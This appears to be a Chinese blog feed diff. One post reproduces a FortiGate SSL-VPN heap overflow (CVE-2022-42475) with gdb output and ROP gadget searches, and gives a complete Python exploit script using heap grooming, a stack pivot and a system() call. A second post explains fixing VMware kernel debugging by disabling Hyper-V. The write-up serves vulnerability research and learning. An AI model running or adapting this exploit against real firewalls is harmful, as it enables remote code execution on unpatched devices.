+    sk = create_ssl_ctx()
+    socks.append(sk)
+ 
+exp_sk.sendall(data)
+ 
+exp_sk.sendall(b'\x90'*0x10000)
+ 
+for sk in socks:
+   if sk:
+       data = b'C' * 40
+       sk.sendall(data)
+
+print(&quot;done&quot;)
+</code></pre>
+<p>这里有几点说明一下：</p>
+<ul>
+<li>用于溢出的<code>exp_sk</code>这里，其实host根本不重要，填什么都可以，实际连接目标由 <code>create_ssl_ctx()</code> 中的 <code>_socket.connect((ip, port))</code> 决定，重要的是cl值，只要cl值对，加上是一个应用层 HTTP 协议头，就能够触发</li>
+<li>ssl/tls库或许会对触发crash有所影响，建议不要使用Ubuntu16，因为我一开始在Ubuntu16上进行了大量尝试，都不能触发crash，最后是依靠一种有点玄学的手段才能触发，后来发现跟Ubuntu16环境有关，具体来说
+<ul>
+<li>在Ubuntu22跟win11上的崩溃脚本都能稳定触发crash，但唯独Ubuntu16不可以，其中，Ubuntu16Python版本为2.7.12，Ubuntu22为2.7.18，win11为3.11.9</li>
+<li>我怀疑是OpenSSL版本问题，因为16使用的是OpenSSL 1.0.2g，而Ubuntu22.04/win11都是OpenSSL 3.0.x</li>
+<li>查看了FortiGate 7.2.4（我的实验虚拟机）：显示<code>set ssl-min-proto-version TLSv1-2</code>:，<strong>最低要求使用 TLS 1.2</strong> 进行连接，但其实Ubuntu16也是满足要求的，所以也不能彻底确定，或许之后有兴趣会继续探究</li>
+</ul>
+</li>
+</ul>
+<p>最后，在前人基础上，也是实现了<code>jmp crash</code>这一步</p>
+<figure data-type="image" tabindex="13"><img src="https://raw.githubusercontent.com/Augu5tu/picture/img/image-20250420174359795.png" alt="image-20250420174359795" loading="lazy"></figure>
+<h3 id="确定偏移">确定偏移</h3>
+<p>直接用<code>cyclic</code>，简单粗暴</p>
+<p>将脚本略作修改：</p>
+<pre><code class="language-python">exp_sk.sendall(data)
+cyclic_pattern = cyclic(PATTERN_LENGTH, n=8)
+exp_sk.sendall(cyclic_pattern)
+# exp_sk.sendall(b'\x42'*0x10000)
+</code></pre>
+<figure data-type="image" tabindex="14"><img src="https://raw.githubusercontent.com/Augu5tu/picture/img/image-20250420180047824.png" alt="image-20250420180047824" loading="lazy"></figure>
+<h4 id="具体分析">具体分析</h4>
+<pre><code class="language-c">__int64 __fastcall sub_1811260(__int64 a1, __int64 a2)
+{
+  int v2; // r14d
+  __int64 v4; // rbx
+  __int64 v5; // rax
+  _DWORD *v6; // rax
+  __int64 v7; // rsi
+
+  v2 = 30;
+  v4 = sub_18174B0(*(unsigned int *)(a1 + 144));
+  register_named_callback(a2, &quot;send_expect_100&quot;, 0LL, 4LL, sub_1811020);
+  register_named_callback(a2, &quot;read_post_data&quot;, 0LL, 1LL, sslvpn_read_post_data_cb);
+  sub_181BD70(a2, sub_1810F80);
+  sub_181BD90(a2, sub_1811180);
+  if ( v4 )
+    v2 = *(_DWORD *)(v4 + 68);
+  v5 = sub_181B860(a1);
+  if ( !v5 || (v6 = *(_DWORD **)(v5 + 56)) == 0LL || (v7 = 1000LL, (unsigned int)(*v6 - 6) &lt;= 2) )
+    v7 = (unsigned int)(100 * v2);
+  sub_181BD80(a2, v7, 0LL);
+  return 0LL;
+}
+</code></pre>
+<p>这是SSL结构体初始化函数</p>
+<p>why：</p>
+<ul>
+<li><strong>目标参数 <code>a2</code>:</strong> 函数接收 <code>a2</code> 作为参数，并且随后多次将 <code>a2</code> 作为<strong>第一个参数</strong>传递给其他 <code>sub_...</code> 函数（如 <code>sub_181BC20</code>, <code>sub_181BD70</code>, <code>sub_181BD90</code>, <code>sub_181BD80</code>）。这通常意味着这些被调用的函数是在<strong>操作或设置 <code>a2</code> 指向的那个数据结构</strong>。</li>
+</ul>
+<p>这里会把字符串 <strong>read_post_data</strong>拷贝到距离结构体偏移为 <strong>200</strong>的地方</p>
+<p>溢出函数指针：</p>
+<pre><code class="language-c">__int64 __fastcall sub_180C0A0(__int64 a1, char a2)
+{
+  ......
+      if ( v9 )
+      {
+        result = v8 + 96;
+        if ( v9 != v8 + 96 )
+        {
+          v10 = *(__int64 (__fastcall **)(__int64))(v9 + 192);
+          if ( v10 )
+            return v10(a1);
+          ......
+}
+</code></pre>
+<p>这里看出，我们要劫持的函数指针在结构体偏移为 <strong>192</strong>的地方。</p>
+<p>所以我们只要找到字符串 <strong>read_post_data</strong>，将它的地址减8，就能得到函数指针地址，再确定溢出开始的地址，两者相减，就得到了具体偏移</p>
+<pre><code class="language-assembly">(gdb) i r $rdi
+rdi            0x7f6edef01818   140114163406872
+(gdb) x/10gx 0x7f6edef01818
+0x7f6edef01818: 0x0000000000000000      0x0000000000000000
+0x7f6edef01828: 0x0000000000000000      0x0000000000000000
+0x7f6edef01838: 0x0000000000000000      0x0000000000000000
+0x7f6edef01848: 0x0000000000000000      0x0000000000000000
+0x7f6edef01858: 0x0000000000000000      0x0000000000000000
+(gdb) x/10gx 0x7f6edef02638
+0x7f6edef02638: 0x0000000000000000      0x736f705f64616572
+0x7f6edef02648: 0x0000617461645f74      0x0000000000000000
+0x7f6edef02658: 0x0000000000000000      0x0000000000000000
+0x7f6edef02668: 0x0000000000000000      0x0000000000000000
+0x7f6edef02678: 0x0000000000000000      0x0000000000000000
+(gdb) x/s 0x7f6edef02640
+0x7f6edef02640: &quot;read_post_data&quot;
+
+</code></pre>
+<h3 id="栈迁移">栈迁移</h3>
+<p>​	仅仅控制程序跳转到<strong>一个</strong>地址通常是不够的。为了执行更复杂的操作，比如设置参数并调用 <code>system</code> 函数来执行命令，需要执行一系列指令。在有 NX (No-eXecute) 保护的系统上，不能简单地直接跳转到堆上你写入的 shellcode 来执行。因此，最常用的技术是<strong>面向返回的编程 (Return-Oriented Programming, ROP)</strong>。</p>
+<p>​	目标：找到一个 gadget，它的功能是<strong>将 <code>RSP</code> 的值修改为你可控的某个地址</strong>，这个地址指向我们在堆溢出数据中布置好的 ROP 链。</p>
+<figure data-type="image" tabindex="15"><img src="https://raw.githubusercontent.com/Augu5tu/picture/img/image-20250422201016411.png" alt="image-20250422201016411" loading="lazy"></figure>
+<p>看我们现在的GDB，rax跟rdx是可以被控制的，rax是用来控制流劫持的，所以，我们要找到一个类似<code>push rdx;pop rsp;ret</code>这样的，将<code>rdx</code>的值转为栈基址，从而实现栈迁移</p>
+<pre><code class="language-bash">augustu@augustu-ubuntu22:~/Downloads/f724$ grep &quot;.*push.*rdx.*pop.*rsp.*ret.*&quot; gadgets.txt
+0x0000000002b08c46 : clc ; push qword ptr [rsi + rdx*2 + 0x41] ; pop rsp ; pop r13 ; pop rbp ; ret
+0x00000000019ff110 : pop rsp ; push rdx ; add bl, byte ptr [rbx + 0x41] ; pop rsp ; pop rbp ; ret
+0x0000000002b08c47 : push qword ptr [rsi + rdx*2 + 0x41] ; pop rsp ; pop r13 ; pop rbp ; ret
+0x0000000001d3379c : push rdx ; adc byte ptr [rbx + 0x41], bl ; pop rsp ; pop rbp ; ret
+0x00000000019ff111 : push rdx ; add bl, byte ptr [rbx + 0x41] ; pop rsp ; pop rbp ; ret
+</code></pre>
+<p>这里找不到，只能使用类似的<code>0x1d3379c</code></p>
+<p>算出来<code>rax</code>偏移为3613，<code>rdx</code>偏移为3421</p>
+<pre><code>0x00000000005bb1e4 : pop rdi ; ret
+0x0000000001143c4e : pop rsi ; ret
+0x000000000264c78a : pop rdx ; ret
+
+</code></pre>
+<h3 id="构造rop">构造ROP</h3>
+<h4 id="具体思路">具体思路</h4>
+<p><code>rax</code>跟<code>rdx</code>偏移已经算出来了，所以我们的payload应该形如这样：</p>
+<pre><code class="language-bash">|AAA（3421）| ROP_chain | CCC（192-len(payload)） | pivot_gadget |
+</code></pre>
+<p><code>pivot_gadget</code>就是我们刚刚选择的<code>0x1d3379c</code>:</p>
+<p><code> push rdx ; adc byte ptr [rbx + 0x41], bl ; pop rsp ; pop rbp ; ret</code></p>
+<p>注意，</p>
+<pre><code class="language-bash">AAA（3421）| ROP_chain | CCC（192-len(payload)）
+</code></pre>
+<p>这里的长度为3421+192=3613，加上我们前面提到的<code>jmp rax</code>这个crash，所以这里<code>rax</code>会被赋值为<code>pivot_gadget</code>：<code>0x1d3379c</code></p>
+<p>这里会将<code>rdx</code>的值（也就是我们<code>ROP_chain</code>的其实地址）压到栈中，然后<code>pop rsp</code>改变栈基址</p>
+<p>注意，因为后面还有一句<code>pop rbp</code>，会把<code>rsp</code>的值+8，所以<code>ROP_chain</code>开头要填充八个字节，下面就可以随意构造我们的<code>ROP_chain</code>了</p>
+<p>我们的最终目标是构造<code>system(cmd,0,0)</code></p>
+<p>所以，要达成如下目标：</p>
+<ul>
+<li><code>rdi</code>寄存器指向<code>cmd</code>命令的地址</li>
+<li><code>rsi</code>寄存器值为0</li>
+<li><code>rdx</code>寄存器值为0</li>
+</ul>
+<p>后面两项很好解决，寻找<code>pop rdx; ret</code>以及<code>pop rsi ; ret</code>这两个gadget就可以</p>
+<p>但因为程序中没有现成的命令，需要我们自己构造，我们就需要自己计算命令行字符串的地址，这里提供一种方法：</p>
+<p>将<code>cmd_string = b&quot;/bin/busybox echo &gt; 2.txt&quot;+b'\x00' * 7</code>放在<code>ROP_chain</code>的最后（末尾要加7个<code>0x00</code>是因为<code>/bin/busybox echo &gt; 2.txt</code>一共有25个字节，读取字符串的时候需要读到<code>0x00</code>表示结束，25+7=32刚好为8的倍数）</p>
+<p>但我们传给<code>rdi</code>需要为字符串的地址，注意：</p>
+<ul>
+<li>一开始的时候我们传给<code>rdx</code>的值就是<code>ROP_chain</code>的开头地址</li>
+<li>开头的<code>b'B'*8</code>跟最后的字符串之间的长度是固定的</li>
+<li>所以我们只需要给一个寄存器赋值为这个偏移，再让<code>rdx</code>加上这个寄存器，最后赋值给<code>rdi</code></li>
+<li>就达到了我们的目的-&gt;给<code>rdi</code>寄存器传<code>cmd</code>命令的地址</li>
+</ul>
+<p>这里我选用<code>rax</code>寄存器作为这个目标寄存器</p>
+<h4 id="构造过程">构造过程</h4>
+<p>一开始需要把偏移传给<code>rax</code>寄存器，应该找一个<code>pop rax ; ret</code>，然后后面加上<code>offset</code>，就能达到给<code>rax</code>赋值的目的，但这里我遇到了一个很奇怪的事情：</p>
+<p><code>offset</code>不能成功写入栈中，栈上把<code>offset</code>后面的一个<code>gadgets</code>写了两次，这里我始终没有思考明白</p>
+<figure data-type="image" tabindex="16"><img src="https://raw.githubusercontent.com/Augu5tu/picture/img/image-20250423220850049.png" alt="image-20250423220850049" loading="lazy"></figure>
+<p>这里我最后只能写了两次<code>offset</code>（写两次<code>offset</code>反而能正常的都写入栈中），为了弹出多的一个<code>offset</code>，我只能放弃使用<code>pop rax ; ret</code>，寻找了一个里面能多<code>pop</code>掉一个的<code>gadgets</code></p>
+<p>后面我使用了<code>add rax , rdx ; ret</code>，因为这个gadgets会将值加到<code>rax</code>寄存器上，所以要继续寻找一个类似<code>push rax ; pop rdi ; ret</code>的gadgets，但没有找到，只找到了</p>
+<pre><code class="language-bash">0x0000000002ac0cb3 : push rax ; pop rbx ; pop r12 ; pop rbp ; ret
+</code></pre>
+<p>因为多了两个<code>pop</code> ，后面多加了两个junk来平衡栈</p>
+<p>然后就是<code>push rbx ; pop rdi ; ret</code>将字符串地址传到<code>rdi</code>了</p>
+<p>后面就是将<code>rsi</code>、<code>rdx</code>置0</p>
+<h2 id="结果">结果</h2>
+<p>可以看到，最终各个寄存器成功赋值，命令成功构造</p>
+<figure data-type="image" tabindex="17"><img src="https://raw.githubusercontent.com/Augu5tu/picture/img/image-20250423212104980.png" alt="image-20250423212104980" loading="lazy"></figure>
+<figure data-type="image" tabindex="18"><img src="https://raw.githubusercontent.com/Augu5tu/picture/img/image-20250423212143306.png" alt="image-20250423212143306" loading="lazy"></figure>
+<h3 id="exp">exp</h3>
+<p>完整利用脚本如下：</p>
+<pre><code class="language-python">import socket
+import ssl
+from pwn import *
+ 
+path = &quot;/remote/login&quot;.encode()
+ 
+ip = &quot;192.168.150.131&quot;
+port = 10443
+PATTERN_LENGTH = 8000
+ 
+def create_ssl_ctx():
+    _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    _socket.connect((ip, port))
+    _default_context = ssl._create_unverified_context()
+    _socket = _default_context.wrap_socket(_socket)
+    return _socket
+ 
+ 
+socks = []
+ 
+for i in range(60):
+    sk = create_ssl_ctx()
+    data = b&quot;POST &quot; + path + b&quot; HTTP/1.1\r\nHost: 192.168.150.131\r\nContent-Length: 4096\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\na=1&quot;
+    sk.sendall(data)
+    socks.append(sk)
+ 
+for i in range(20, 40, 2):
+    sk = socks[i]
+    sk.close()
+    socks[i] = None
+ 
+CL = &quot;115964116992&quot;
+data = b&quot;POST &quot; + path + b&quot; HTTP/1.1\r\nHost: 192.168.150.131\r\nContent-Length: &quot; + CL.encode() + b&quot;\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\na=1&quot;
+
+exp_sk = create_ssl_ctx()
+ 
+for i in range(20):
+    sk = create_ssl_ctx()
+    socks.append(sk)
+ 
+exp_sk.sendall(data)
+pop_rax_pop_rbx_ret = p64(0x2982884)
+add_rax_rdx_ret = p64(0x462268)
+push_rax_pop_rbx_pop_r12_pop_rbp_ret = p64(0x2ac0cb3)
+push_rbx_pop_rdi_ret = p64(0x80ede9)
+pop_rsi_ret = 0x1143c4e
+pop_rdx_ret = 0x264c78a
+system_plt = 0x56DF45
+pivot_gadget = p64(0x1d3379c)
+cmd_string = b&quot;/bin/busybox echo &gt; 2.txt&quot;+ b'\x00' * 7
+offset = 0x70
+
+
+rop_chain = b&quot;B&quot;*8
+rop_chain += pop_rax_pop_rbx_ret
+rop_chain += p64(offset)
+rop_chain += p64(offset)
+# rop_chain += pop_r12_ret
+rop_chain += add_rax_rdx_ret
+rop_chain += push_rax_pop_rbx_pop_r12_pop_rbp_ret
+rop_chain += b'F'*16
+rop_chain += push_rbx_pop_rdi_ret
+rop_chain += p64(pop_rsi_ret)
+rop_chain += p64(0)
+rop_chain += p64(pop_rdx_ret)
+rop_chain += p64(0)
+rop_chain += p64(system_plt)
+rop_chain += cmd_string
+payload = b'A'*3421 + rop_chain + b'C'*(192-len(rop_chain))+pivot_gadget +b'D'*200
+exp_sk.sendall(payload)
+for sk in socks:
+   if sk:
+       data = b'C' * 40
+       sk.sendall(data)
+
+print(&quot;done&quot;)
+</code></pre>
+<h2 id="面试要点">面试要点</h2>
+<p>PDD面试的时候问到了这个漏洞，记录一下要点，一年前复现的，好多忘了</p>
+<ol>
+<li>
+<p>“如何通过覆盖堆上函数指针，然后实现对栈指针RBP和RSP的控制？”</p>
+<ul>
+<li>
+<p>我觉得想要解释这个问题，就要先解释劫持函数指针的部分</p>
+<p>​	正如我复现过程中发现的，正常构造特殊CL值只能造成进程崩溃，而不能实现漏洞利用，因为漏洞函数处是一个回调函数，它不是一次性处理所有数据，而是循环调用来处理数据块，直到整个请求体处理完毕或者发生错误，如果我们的附加数据庞大的话，它会造成溢出，如果我们不另外附加数据，甚至进程会正常运行，如果溢出，只有在后面触发的时候，才会造成进程崩溃；</p>
+<p>​	这时候，如果我们想覆盖堆上函数指针，就需要进行堆风水，简单来说，先布好局，让我们想要的结构体刚好处在溢出部分的边上，这样，溢出的时候就能覆盖到结构体的关键指针处，这时候如果我们的溢出数据是通过cyclic生成的，直接就能计算出偏移位置，这样，就成功覆盖了堆上的函数指针并获取偏移；</p>
+</li>
+<li>
+<p>下面就是栈迁移的部分</p>
+<p>​	这时候只能一次跳转，我们需要将跳转位置转移到我们能控制的地方，要把我们堆上的数据变成栈上的</p>
+<p>​	这时候最理想的方式就是找一个gadgets，把rsp的值修改成我们堆上数据的地址，这个漏洞我们可控的寄存器有rax、rdx，并且rax还用于上一步的控制流劫持，那我们就要找一个类似push rdx;pop rsp;ret这样的，将rdx的值转换成栈基址，至于rbp，这点倒是无须关心，因为后续都是ROP链利用，直接进行rce，不需要执行原有代码了</p>
+</li>
+</ul>
+</li>
+<li>
+<p>堆溢出时，伪造的<code>Content-Length</code>如何精确导致了后续<code>memcpy</code>可控大小的溢出，以及堆布局在其中的作用。</p>
+<ul>
+<li>简单来说，有一个函数，pool_alloc负责根据传入的CL值分配内存空间，但在具体汇编代码中，它会将存储CL值的结构体里的某个元素先转移到eax上（原来这个元素的值存储的位置是rax+0x18）</li>
+<li>这样的话，如果CL值非常庞大就会导致前面的八位消失，比如0x1b00000000存到eax中，因为eax是32位寄存器，它只能存储0x0000 0000，后面的汇编代码中虽然又用到了rax，但这时候值已经被改变了，我记得是有一个lea esi,[rax+1]导致最后分配内存的时候，只能按照[eax+1]的值分配内存大小</li>
+<li>并且后面会有memcpy函数会将我们附加的payload写入内存中，这就很容易造成堆溢出</li>
+<li>加上我们之前使用堆风水进行的布局，就会导致payload溢出到关键结构体的函数指针中</li>
+</ul>
+</li>
+</ol>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[vmware 双机联调 不能下断点 debug 问题]]></title>
+        <id>https://augu5tu.github.io/post/vmware-debug-problem/</id>
+        <link href="https://augu5tu.github.io/post/vmware-debug-problem/">
+        </link>
+        <updated>2024-01-09T08:59:47.000Z</updated>
+        <content type="html"><![CDATA[<p>在复现CVE-2022-42475 FortiGate 防火墙 漏洞时遇到了一个问题</p>
+<p>跟着<a href="https://forum.butian.net/share/2166">CVE-2022-42475 FortiGate SSLVPN 堆溢出漏洞分析与利用</a>和<a href="https://i3r0nya.cn/wiki/note/reverse/cve-2022-42475/">CVE-2022-42475 复现研究</a>、<a href="https://wzt.ac.cn/2022/12/15/CVE-2022-42475/">CVE-2022-42475</a>做了前面的环境准备和提取二进制等工作后在通过patch绕过文件系统校验这一步卡住了</p>
+<h2 id="具体情况">具体情况</h2>
+<p>使用vmlinux-to-elf将flatkc文件转换为elf文件后，使用gdb加载，再target remote进行远程连接后在call fgt_verify处下断点，但只要开始c那么FortiGate虚拟机就会直接关闭</p>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/Augu5tu/picture/img/image-20240119151002626.png" alt="image-20240119151002626" loading="lazy"></figure>
+<p>这个问题困扰了我们很长时间，刚刚算了一下，到现在快两个月了，终于找到了解决方法</p>
+<h2 id="解决方法">解决方法</h2>
+<p>关闭hyper-v和Device Guard</p>
+<ul>
+<li>
+<p>禁用Device Guard或Credential Guard</p>
+<ol>
+<li>在主机操作系统上，右键单击“<strong>开始”</strong> &gt; <strong>“运行”</strong>，键入gpedit.msc，然后单击“ **确定”。**本地组策略编辑器打开。</li>
+<li>转至<strong>本地计算机策略</strong> &gt; <strong>计算机配置</strong> &gt; <strong>管理模板&gt;系统</strong> &gt;<strong>Device Guard（或者是： 设备防护）</strong> &gt; <strong>启用基于虚拟化的安全性</strong>。</li>
+<li>选择<strong>已禁用</strong>。</li>
+</ol>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/Augu5tu/picture/img/image-20240119150736191.png" alt="image-20240119150736191" loading="lazy"></figure>
+</li>
+<li>
+<p><strong>以管理员身份运行Windows Powershell (管理员)（Windows键+X）</strong></p>
+<p>​    运行下面命令并重启电脑：</p>
+<pre><code class="language-cobol">bcdedit /set hypervisorlaunchtype off
+</code></pre>
+</li>
+</ul>
+<p>这时候再进行尝试的话，一句话，怎么调怎么有</p>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/Augu5tu/picture/img/image-20240119143653223.png" alt="image-20240119143653223" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/Augu5tu/picture/img/image-20240119144850038.png" alt="image-20240119144850038" loading="lazy"></figure>
+<h2 id="原因探究">原因探究</h2>
+<p>我查看了Microsoft的官方文档介绍，这个也就是他说的<code>内存完整性</code>的另一个名字，对于这个内存完整性，文档介绍是</p>
+<blockquote>
+<p><strong>内存完整性</strong> 是 Windows 中提供的基于虚拟化的安全 (VBS) 功能。 内存完整性和 VBS 改进了 Windows 的威胁模型，并针对试图利用 Windows 内核的恶意软件提供更强大的保护。 VBS 使用 Windows 虚拟机监控程序创建独立的虚拟环境，该环境成为假定内核可能遭到入侵的 OS 的信任根。 内存完整性是一个关键组件，它通过在 VBS 的独立虚拟环境中运行内核模式代码完整性来保护和强化 Windows。 内存完整性还限制可用于破坏系统的内核内存分配。</p>
+</blockquote>
+<blockquote>
+<h2 id="内存完整性功能">内存完整性功能</h2>
+<ul>
+<li>保护内核模式驱动程序的控制流防护 (CFG) 位图的修改。</li>
+<li>保护内核模式代码完整性进程，确保其他受信任的内核进程具有有效的证书。</li>
+</ul>
+</blockquote>
+<p>第一个功能，我找了几篇介绍CFG的文章看了一下，感觉是为了防止对内核模式驱动程序的控制流进行恶意修改。如果我尝试在虚拟机内通过修改控制流来影响内核模式驱动程序，内存完整性功能可能会检测到这样的修改，然后结束这个进程，造成我虚拟机直接退出的情况，我觉得是很有可能的</p>
+<p>第二个功能我不太了解进程证书的情况，不知道会不会产生什么影响</p>
+<p>但总的来说，在一个虚拟机里用GDB连接到另一个虚拟机，而且还在它启动的时候改内存，感觉触发内存完整性功能的检测还是挺有可能的，因为这涉及对内核模式代码的操作，尤其是对控制流的修改，也刚好能解释为什么不下断点能够正常运行，因为并没有修改控制流</p>
+<p>然后我尝试了再次开启hyper-v，在内存完整性关闭的情况下，仍然会同样断开</p>
+<p>Hyper-V 利用硬件虚拟化技术（如Intel VT-x或AMD-V）来提高虚拟机性能，并支持在虚拟机中运行受保护的内核模式代码。虚拟化本身引入了一些额外的层次，可能会影响对内存和控制流的访问，之前VMware官方人员要求关闭也不是没有理由的。</p>
+<h2 id="辛酸历程">辛酸历程</h2>
+<p>简单回顾一下这段时间的辛酸历程，我都不太相信我能成功了</p>
+<ul>
+<li>开头两周配了个防火墙环境，当时官网上下载的726的固件</li>
+<li>完了就是二进制提取，然后静态分析啥的，到这里还一切正常</li>
+<li>然后开始做，调试，遇到问题，怀疑是不是断点没下好啊，又开始分析，还寄希望于能够通过静态分析和动调找到到底是哪里让我们结束了这个程序</li>
+<li>中间各种分析，找了结束程序的函数、重启函数，我记得当时TAO还创了一个秒表法，根据时间来判断会进到哪一个函数，祈祷运气特别好就遇到了正确的地方，中间n了好长时间，分析的眼都花了，各个函数分析吐了</li>
+<li>后来放弃了，觉得不行咱们先找师兄，用他做过的固件做一下，这时候开始做7.2.4</li>
+<li>中间师兄亲自下场，可惜相同的地方遇到了相同的问题</li>
+<li>之后期末周，又被折磨了快一个月</li>
+<li>然后开始想，到底是哪边可能有问题，觉得还是调试的部分，直接用什么也没改的固件开始调</li>
+<li>惊讶的发现，ctmd，啥也没改也断不了，中间一步一步n，看为什么断，总是在各种奇奇怪怪的地方出问题</li>
+<li>师兄感觉这个可能是gdb或者Ubuntu版本问题，我感觉也确实有可能，又开始配了一波环境，16，18，20，22，gdb、peda、pwndbg排列组合都试了，大同小异</li>
+<li>师兄又来操作了一波，还专门写了个脚本，昨晚帮我们干到7：30才去吃完饭，食堂都快下班了，还是没能成功</li>
+<li>最后实在没辙，用师兄的老电脑试了，人就是能成，我TM就是成不了</li>
+<li>开始挨个排查，文件换师兄的，没用；FortiGate固件直接换，也没用；Ubuntu16也直接换，还是没用，啥都一样了，不可能是VMware版本吧，没辙了，先试试</li>
+<li>在换vm 16的时候看见提示，说Hyper-v或者Device Guard未关闭啥的，我一想，不对啊，我不早就关了吗</li>
+<li>挺早的时候，网上查了相关的问题，VMware 的官方支持团队答过一个沾了一点边的，说hyper-v要关掉，另外，这个问题好像网上没有说过的</li>
+<li>然后终于能够成功</li>
+<li>试了又将VMware 升级到17，还是能够成功，一句话，怎么试怎么有了</li>
+</ul>
+<p>我都想买个失败总是贯穿人生始终放桌子上了，终于，还是没有被贯穿到底</p>
+]]></content>
+    </entry>
+</feed>
